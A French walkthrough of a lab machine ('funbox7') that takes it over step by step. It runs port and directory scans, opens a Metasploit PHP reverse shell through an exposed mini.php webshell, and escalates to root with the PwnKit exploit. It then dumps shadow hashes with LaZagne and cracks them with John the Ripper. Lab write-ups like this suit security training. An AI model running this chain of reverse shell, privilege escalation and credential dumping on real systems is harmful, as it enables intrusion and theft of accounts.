1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌──[parrot@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh 

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.121
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.121...100%
[+] Scan Nmap 192.168.56.121...100%
 
[+] 80/tcp open
[+] 22/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.121-tcp.html       |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">👊 **Gobuster**</span>

<span style="color: #dddddd;">Voyons les `dir` caché</span>

```
┌─[parrot@parrot]─[~]
└──╼ $gobuster dir -u http://192.168.56.121 -w /usr/share/wordlists/dirb/common.txt -x html,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.121
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 10918]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.56.121/javascript/]
/mini.php             (Status: 200) [Size: 4443]
/phpmyadmin           (Status: 301) [Size: 321] [--> http://192.168.56.121/phpmyadmin/]
/robots.txt           (Status: 200) [Size: 21]
/secret               (Status: 301) [Size: 317] [--> http://192.168.56.121/secret/]
/server-status        (Status: 403) [Size: 279]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
```

&nbsp;

Allons voir ce qu’est `mini.php`

![Capture du 2025-02-16 21-14-03.png](../../_resources/Capture%20du%202025-02-16%2021-14-03.png)

&nbsp;

<span style="color: #dddddd;">💥</span> **Metasploit - webshell**

```
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 192.168.56.104
lhost => 192.168.56.104
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Sending stage (40004 bytes) to 192.168.56.121
[*] Meterpreter session 1 opened (192.168.56.104:4444 -> 192.168.56.121:51054) at 2025-02-16 20:39:29 +0100

(Meterpreter 1)(/var/www/html) > 

```

&nbsp;

<span style="color: #dddddd;">🤖</span> **Linpeas**

Recherche de vulnérabilité pour devenir root

```
www-data@funbox7:/tmp$ sh linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

```

&nbsp;

<span style="color: #dddddd;">💀 **Exploit** **Pwnkit**</span>

<span style="color: #dddddd;">Test de l’élévation de privilege</span>

```
www-data@funbox7:/tmp$ ./PwnKit
./PwnKit
bash -i
root@funbox7:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@funbox7:/tmp# 
```

&nbsp;

**<span style="color: #dddddd;">👾</span> LaZagne**

Recherche d’identifiant sur la machine

```
root@funbox7:/tmp/LaZagne-2.4.6/Linux# python3 laZagne.py all
python3 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: oracle
Hash: $6$Yp0m4etu$y/zFDtp2oFnAN7dYF43z3ug/JNTx.pVnOLjnBvCj6Se1FPQcGM4KYiNYeumQhP9WjlYVSoaZ2yTZChujKHMUF0:18523:0:99999:7:::

[+] Hash found !!!
Login: sally
Hash: $6$bbpLxjoM$kTLBsKFGl7xBu/1ELvsQCimo4A8cKx3qgBohDaq4732Ux2bwpCTUyXlX4D9cYNNCo5ziqwxK7piHuaav7ozDT0:18523:0:99999:7:::

[+] Hash found !!!
Login: harry
Hash: $6$SEUHOU5Y$BqNxc9Vx.50yikVXt0fpl4VWEmushoGPJaYI9.av3FnA4fM8UGxZcuj1o042BaX6tFxxd3T4towaeZWku2s1/.:18523:0:99999:7:::

[+] Hash found !!!
Login: goat
Hash: $6$b1bFqxKd$hXr3E6z/psauy03uPpQppUl/H65LArbPDHK/1mWkAiZaac8wOFuLaZerOqSisgEjpsmenl7Z0v4jUn.SetiLc/:18523:0:99999:7:::

[+] Hash found !!!
Login: karla
Hash: $6$3BbRbY6RnAAHMSY5$DMtzaijjLePQs2PNQP1NEj0GQwZxZ6zhhCVGD55eiVVF8i9IVu.t0QxOyYh2WgjaaiPKSOwDhAIhSv4L4qFVk/:18523:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$lspDLPS8$ydxj8dKxV7Q/gfnU/ZDQcviI/h/MsgXm.WDt76gVyubYTj2PHRyAmn0qx8fVBoAHUzdCTtHYzhZAK5c0apXA51:18524:0:99999:7:::

------------------- Grub passwords -----------------

[+] Hash found !!!
Hash: $1$gLhU0/$aW78kHK1QfV3P2b2znUoe/


[+] 7 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.10487747192382812
```

&nbsp;

🧨 **JohnTheRipper**

Crack des hash utilisateurs

```
┌──[parrot@parrot]─[~/Desktop]
└──╼ $john funbox7 --wordlist=rockyou.txt
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
topsecret	 (?)
12345            (oracle)     
tgbzhnujm!       (karla)
iubire           (sally)
123456           (harry)
thebest          (goat)
2g 0:00:01:05 1.48% (ETA: 22:36:41) 0.03064g/s 3828p/s 3843c/s 3843C/s andrew1995..affirmation
Use the "--show" option to display all of the cracked passwords reliably
Session completed
┌──[parrot@parrot]─[~/Desktop]
└──╼ $john funbox7 --show
sally:iubire:18523:0:99999:7:::
harry:123456:18523:0:99999:7:::
goat:thebest:18523:0:99999:7:::
karla:tgbzhnujm!:18523:0:99999:7:::
oracle:12345:18523:0:99999:7:::
?:topsecret

6 password hashes cracked, 0 left
```

&nbsp;

Identifiant trouver

| Users | Passwords |
| --- | --- |
| oracle | 12345 |
| karla | tgbzhnujm! |
| sally | iubire |
| harry | 123456 |
| goat | thebest |
| ?   | topsecret |